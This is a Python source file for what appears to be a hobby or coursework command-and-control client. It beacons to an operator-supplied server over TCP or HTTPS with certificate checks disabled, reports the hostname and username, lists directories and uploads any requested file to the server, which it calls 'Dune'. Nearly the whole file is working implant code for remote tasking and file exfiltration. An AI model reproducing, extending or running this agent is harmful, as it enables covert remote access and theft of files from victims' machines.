import socket
import json
import time
import sys
import os
import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# TODO : Est-ce que tu peux faire de le manipuler comme dans celui de GoSec ?
# Genre à partir de serveur
BUFFER_SIZE = 4096  # Size of chunks to send for file transfers


def get_system_info():
    """
    Retrieve the current system's hostname and username.
    """

    hostname = socket.gethostname()
    username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"

    # TODO : supporter linux et windows ??
    # Pour system info c'est facile avec les variable env USER et NAME


    return hostname, username


def format_list_output():
    """
    Format the directory listing similar to Windows Powershell's ls
    """

    entries = []
    try:
        for entry in os.scandir():
            mode = "d" if entry.is_dir() else "-"
            size = entry.stat().st_size // 1024 # convert bytes to KB
            mod_time = datetime.datetime.fromtimestamp(
                entry.stat().st_mtime
            ).strftime("%Y-%m-%d %H:%M:%S")
            entries.append(f"{mode:1} {mod_time:19} {size:10} KB {entry.name}")

    except Exception as e:
        return f"ERROR: Unable to list files ({e})"
    
    return "\n".join(entries) if entries else "[Empty Directory]"


def send_file(client_socket, filename):
    """
    Send a file to the server in chunks
    """
    if not os.path.isfile(filename):
        print(f"[-] Error file {filename} not found.")
        client_socket.sendall(f"ERROR: File '{filename}' not found\n".encode())
        return
    
    try:
        client_socket.sendall(f"FILE_START {filename} {os.path.getsize(filename)}\n".encode())
        ack = client_socket.recv(1024).decode()
        if ack == "ACK":

            with open(filename, "rb") as file:
                while chunk := file.read(BUFFER_SIZE):
                    client_socket.sendall(chunk)

            client_socket.sendall("FILE_END\n".encode())
            print(f"[+] File '{filename}' sent successfully")
        else:
            print(f"[-] No ACK from server, aborting.")
        
    except Exception as e:
        print(f"ERROR: {str(e)}\n".encode())

    finally:
        return


def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <server_ip> <server_port> <proto>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    proto = sys.argv[3]

    hostname, username = get_system_info()
    if proto == "tcp":
        try:
            # Connect to the TCP server
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))

            # Send hostname and username
            response = client_socket.sendall(f"{hostname},{username}\n".encode())

            # Peut probablement enlever cela
            if response == "ACK":
                print("[+] Server acknowledged connection.")

            # Enter listening mode
            while True:
                command = client_socket.recv(1024).decode().strip()

                if not command:
                    print("[-] Connection lost. Exiting")
                    break

                print(f"[Server] {command}")

                command = command.lower()

                # TODO : send to handler function that redistribute
                # to differents functions than returns
                if command == "exit":
                    print("[+] Server requested termination. Closing connection")
                    break

                elif command.startswith("echo "):
                    message = command[5:].strip()
                    client_socket.sendall(f"Echo: {message}\n".encode())

                elif command == "ack":
                    pass

                
                elif command == "list":
                    files = format_list_output()
                    client_socket.sendall(f"FILES\n{files}\nEND_FILES\n".encode())

                elif command.startswith("download "):
                    filename = command[9:].strip()
                    print(f"[-] Sending {filename} to Dune!")
                    send_file(client_socket, filename)


                else:
                    client_socket.sendall(f"Unknown command: {command}\n".encode())


        except Exception as e:
            print(f"[-] Error : {e}")

        finally:
            client_socket.close()

    elif proto == "http":
        url = f"https://{server_ip}:{server_port}"

        try:
            response = requests.get(url + "/register", verify=False)
            body = response.text
            if "Welcome" in body:
                uuid = body.split("Welcome ")[1].strip()
                print(f"[+] Successfully registered with UUID {uuid}")

                # Continued loop to query commands:
                while True:
                    time.sleep(1)
                    response = requests.get(url + f"/{uuid}/get_command", verify=False)
                    body = response.text

                    try:
                        data = json.loads(body)
                        status = data.get("status")

                        if status == "ok":
                            command = data.get("command")
                            args = data.get("args")
                            print(f"[Server] {command} {args}")
                            handle_http_commands(command, args, uuid, url)


                            if command == "exit":
                                print("[+] Server requested termination. Exiting")

                    except json.JSONDecodeError:
                        print(f"[-] Error decoding JSON: {body}")
                        continue

        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            sys.exit(1)


    else:
        print(f"[-] Invalid protocol {proto}. Choose between http and tcp. Exiting.")
        sys.exit(1)


def handle_http_commands(command, args, uuid, url):
    if command == "list":
        files = format_list_output()
        response = requests.post(url + f"/{uuid}/list", data=files, verify=False)
        if "received" in response.text:
            print("[+] Files listing sent successfully")
        else:
            print("[-] Error sending files listing")
            
    elif command == "download":
        if args is None:
            print("[-] No file specified for download")
            return
        else:
            filename = args['file_path']
            print(f"[-] Sending {filename} to Dune!")

            try:
                with open(filename, 'rb') as file:
                    files = {"file": (filename, file)}
                    url = url + f"/{uuid}/download"
                    headers = {'File-Name': filename}

                    response = requests.post(url, files=files, verify=False, headers=headers)

                    if response.status_code == 200:
                        print(f"[+] File {filename} sent successfully")
                    else:
                        print(f"[-] Error sending file {filename}")

            except FileNotFoundError:
                print(f"[-] File {filename} not found")
            except requests.exceptions.RequestException as e:
                print(f"[-] Error sending file: {e}")

    else:
        print(f"[-] Unknown command: {command}")


if __name__ == '__main__':
    main()
    

"""
TODO:

- Est-ce que faire une classe pour le client serait plus efficace ?

"""